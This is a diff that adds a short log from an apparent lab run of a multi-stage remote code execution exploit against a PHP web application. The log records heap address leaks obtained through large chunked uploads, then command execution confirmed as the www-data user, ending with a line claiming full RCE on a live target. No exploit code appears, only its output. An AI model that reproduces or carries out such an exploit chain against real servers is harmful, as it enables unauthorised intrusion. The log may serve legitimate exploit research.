@@ -1,0 +1,15 @@
+[12:11:24] target=http://<target>/index.php stage=3 cmd='id>p' log=<repo>/lab/live_run_20261024_121124.log
+[12:11:24] [preflight] GET / -> HTTP/1.1 301 Moved Permanently (0 bytes)
+[12:11:24] [preflight] GET /p -> HTTP/1.1 301 Moved Permanently (pre-existing body=0 bytes)
+[12:11:24] [stage1] try 1: arming (chunked ~140MB upload)...
+[12:11:32] [stage1] arm done in 7.8s: HTTP/1.1 200 OK
+[12:11:34] [stage1] LEAK chunk base = 0x7fd4eec00000 (cluster n=102)
+[12:11:34] [stage2] try 1: arming (chunked ~140MB upload)...
+[12:11:42] [stage2] arm done in 8.6s: HTTP/1.1 200 OK
+[12:11:45] [stage2] LEAK libphp base = 0x7fd4f0600000 (ptr=0x7fd4f0db47a0, dtor gate OK)
+[12:11:45] [*] HT=0x7fd4eec7e0d8 zif_abs=0x7fd4f0b996e0
+[12:11:45] [stage3] cycle 1: arming pads=112 (chunked ~140MB upload)...
+[12:11:54] [stage3] arm done in 9.6s: HTTP/1.1 200 OK
+[12:11:54] [stage3] exploit sent in 0.0s: '<no response>'
+[12:11:57] [stage3] RCE CONFIRMED cycle 1: GET /p -> HTTP/1.1 200 OK body=b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
+[12:11:57] === FULL RCE CONFIRMED ON LIVE TARGET ===
